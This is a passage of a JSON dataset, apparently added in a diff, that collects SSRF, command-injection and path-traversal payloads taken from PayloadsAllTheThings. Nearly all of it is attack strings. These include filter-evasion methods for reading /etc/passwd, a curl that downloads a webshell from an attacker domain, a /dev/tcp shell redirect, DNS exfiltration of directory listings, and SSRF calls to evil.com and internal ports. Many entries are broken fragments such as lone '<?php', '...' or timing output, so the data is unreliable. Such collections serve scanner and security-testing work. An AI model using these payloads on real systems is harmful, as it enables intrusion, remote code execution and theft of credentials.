+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "file://\\/\\/etc/passwd",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=http://127.0.0.1:22",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=http://127.0.0.1:80",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=http://127.0.0.1:443",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=dict://attacker:11111/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=sftp://evil.com:11111/",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=ldap://localhost:11211/%0astats%0aquit",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "ssrf.php?url=netdoc:///etc/passwd",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "gopher://[host]:[port]/[type][selector]",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      },
+      {
+        "payload": "https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg",
+        "category": "ssrf",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "ssrf payload from documentation",
+        "tags": [
+          "ssrf"
+        ]
+      }
+    ],
+    "command_injection": [
+      {
+        "payload": "<?php",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "$ip = $_GET['ip'];",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "system(\"ping -c 4 \" . $ip);",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "?>",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "cat /etc/passwd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "root:x:0:0:root:/root:/bin/bash",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "daemon:x:1:1:daemon:/usr/sbin:/bin/sh",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "bin:x:2:2:bin:/bin:/bin/sh",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "sys:x:3:3:sys:/dev:/bin/sh",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "...",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "command1; command2   # Execute command1 and then command2",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "command1 && command2 # Execute command2 only if command1 succeeds",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "command1 || command2 # Execute command2 only if command1 fails",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "command1 & command2  # Execute command1 in the background",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "command1 | command2  # Pipe the output of command1 into command2",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "chrome '--gpu-launcher=\"id>/tmp/foo\"'",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "ssh '-oProxyCommand=\"touch /tmp/foo\"' foo@foo",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "psql -o'|id>/tmp/foo'",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "$url = \"https://example.tld/\" . $_GET['path'] . \".txt\";",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "system(\"wget.exe -q \" . escapeshellarg($url));",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "curl http://[ATTACKER.DOMAIN.TLD]/ -o webshell.php",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "original_cmd_by_server `cat /etc/passwd`",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "original_cmd_by_server $(cat /etc/passwd)",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "cat${IFS}/etc/passwd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "ls${IFS}-la",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{cat,/etc/passwd}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "cat</etc/passwd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "sh</dev/tcp/127.0.0.1/4242",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "X=$'uname\\x20-a'&&$X",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": ";ls%09-al%09/home",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "ping%CommonProgramFiles:~10,-18%127.0.0.1",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "ping%PROGRAMFILES:~10,-5%127.0.0.1",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "original_cmd_by_server",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "ls",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "$ cat /et\\",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "c/pa\\",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "sswd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "cat%20/et%5C%0Ac/pa%5C%0Asswd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo ~+",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo ~-",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{,ip,a}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{,ifconfig}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{,ifconfig,eth0}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{l,-lh}s",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{,echo,#test}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{,$\"whoami\",}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "{,/?s?/?i?/c?t,/e??/p??s??,}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ echo ${HOME:0:1}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "/",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ cat ${HOME:0:1}etc${HOME:0:1}passwd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ echo . | tr '!-0' '\"-1'",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ tr '!-0' '\"-1' <<< .",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "/etc/passwd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"`",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat $abc",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ xxd -r -p <<< 2f6574632f706173737764",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ cat `xxd -r -p <<< 2f6574632f706173737764`",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ xxd -r -ps <(echo 2f6574632f706173737764)",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ cat `xxd -r -ps <(echo 2f6574632f706173737764)`",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "w'h'o'am'i",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "wh''oami",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "'w'hoami",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "w\"h\"o\"am\"i",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "wh\"\"oami",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "\"wh\"oami",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "wh``oami",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "w\\ho\\am\\i",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "/\\b\\i\\n/////s\\h",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "who$@ami",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo whoami|$0",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "who$()ami",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "who$(echo am)i",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "who`echo am`i",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "/???/??t /???/p??s??",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "test=/ehhh/hmtc/pahhh/hmsswd",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "cat ${test//hhh\\/hm/}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "cat ${test//hh??hm/}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "powershell C:\\*\\*2\\n??e*d.*? # notepad",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "@^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "wHoAmi",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "real    0m5.007s",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "user    0m0.000s",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "sys 0m0.000s",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "swissky@crashlab:~$ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "real    0m0.002s",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "for i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "Payload: 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "Payload: /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\"",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "echo 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "nohup sleep 120 > /dev/null &",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      },
+      {
+        "payload": "g=\"/e\"\\h\"hh\"/hm\"t\"c/\\i\"sh\"hh/hmsu\\e;tac$@<${g//hh??hm/}",
+        "category": "command_injection",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "command_injection payload from documentation",
+        "tags": [
+          "command_injection"
+        ]
+      }
+    ],
+    "path_traversal": [
+      {
+        "payload": "perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "../",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "..\\",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "..\\/",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "%2e%2e%2f",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "%252e%252e%252f",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "path_traversal payload from documentation",
+        "tags": [
+          "path_traversal"
+        ]
+      },
+      {
+        "payload": "%c0%ae%c0%ae%c0%af",
+        "category": "path_traversal",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
